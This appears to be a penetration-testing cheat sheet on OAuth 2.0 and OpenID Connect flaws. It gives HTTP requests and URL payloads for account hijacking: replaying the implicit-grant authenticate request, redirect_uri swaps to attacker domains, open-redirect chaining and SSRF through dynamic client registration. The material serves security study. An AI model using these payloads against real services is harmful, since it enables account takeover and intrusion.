---
title: "OAuth 2.0"
weight: 17
description: "Explore OAuth 2.0 authorization framework, its vulnerabilities, and common security flaws in penetration testing. Learn how to identify OAuth flow and prevent attacks."
---

# OAuth 2.0

{{< details summary="Introduction" >}}

**What is OAuth?**

* OAuth is a commonly used authorization framework that enables web applications to request limited access to a user's account on another application.

**How does OAuth 2.0 work?**

* **Client application** - The website that wants to access the user's data.
* **Resource owner** - The user whose data the client application wants to access.
* **OAuth service provider** - The website or application that controls the user's data and access to it. They support OAuth by providing an API for interacting with both an authorization server and a resource server.

{{< /details >}}

## Identifying OAuth authentication

* If you see an option to log in using your account from a different website, this is a strong indication that OAuth is being used.
* Regardless of which OAuth grant type is being used, the first request of the flow will always be a request to the `/authorization` endpoint containing a number of query parameters that are used specifically for OAuth. In particular, keep an eye out for the `client_id`, `redirect_uri`, and `response_type` parameters

### Recon

If using an external OAuth service, identify the provider by the hostname in the authorization request. Public API documentation typically provides detailed information, including endpoint names and configuration options. Try sending a request to the following standard endpoints:

* `/.well-known/oauth-authorization-server`
* `/.well-known/openid-configuration`

## Vulnerabilities

### Improper implementation of the implicit grant type

At the conclusion of the login process, the client application often sends the username and access token to the server via a `POST` request. The server then issues a session cookie, effectively completing the login and establishing the user session

```http
POST /authenticate HTTP/2
Host: 0a55005703e1680182bd7f6100b60068.web-security-academy.net
[..]

{"email":"lebron@cleveland.com","username":"lebron","token":"ckNqkfxB"}
```

```http
HTTP/2 302 Found
Location: /
Set-Cookie: session=OixJC365d0v7yaU1l1xEnCCtfnRZDhZe; Secure; HttpOnly; SameSite=None
```

Exploitation: repeat this request with an arbitrary account (changing email and username) and leaving the access token

### Account hijacking via redirect\_uri

Replace `redirect_uri` with a attacker controlled domain

```md
https://oauth-x.oauth-server.net/auth?client_id=xyz&redirect_uri=https://attack.com/oauth-callback&response_type=code&scope=openid profile email
```

{{< hint style=notes >}}
**Note**: using `state` or `nonce` protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser.
{{< /hint >}}

**Flawed redirect\_uri validation**

```md
https://default-host.com@foo.evil-user.net
https://oauth-xxx-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
https://localhost.evil-user.net
```

**Chain vulns**&#x20;

If you are unable to successfully submit an external domain as the `redirect_uri` you can chain vulnerabilities like open redirect, xss etc.

1. Find open redirect

```md
https://server.net/post/next?path=https://attacker.com
```

2. Use this url as `redirect_uri`&#x20;

```md
https://oauth-xxx-server.com/?client_id=123&redirect_uri=https://server.net/post/next?path=https://attacker.com[...]
```

{{< hint style=tips >}}
Tip: the default URI will often be on an OAuth-specific path, such as `/oauth/callback`, so you can use directory traversal tricks `https://client-app.com/oauth/callback/../../example/path`
{{< /hint >}}

### Flawed CSRF protection

if you notice that the authorization request does not send a `state` parameter, It potentially means that you can initiate an OAuth flow yourself before tricking a user's browser into completing it, similar to a traditional CSRF attack.

## OpenID Connect

### Identifying OpenID Connect

Look for the mandatory `openid` scope

### Unprotected dynamic client registration

1. Identify configuration file `/.well-known/openid-configuration` to get registration\_endpoint
2. Register your own client app. In the logo\_uri add a external url for SSRF

```http
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "application_type": "web",
    "client_name": "My Application",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
    "logo_uri": "https://BURP-COLLABORATOR-SUBDOMAIN"
}
```

```http
HTTP/2 201 Created
[...]

{[...]"client_id":"aqFGUZgiQmXrUphoMV7i6","client_name":"My Application",[...]}
```

3. Make `GET /client/CLIENT-ID/logo` request and replace the `client_id`
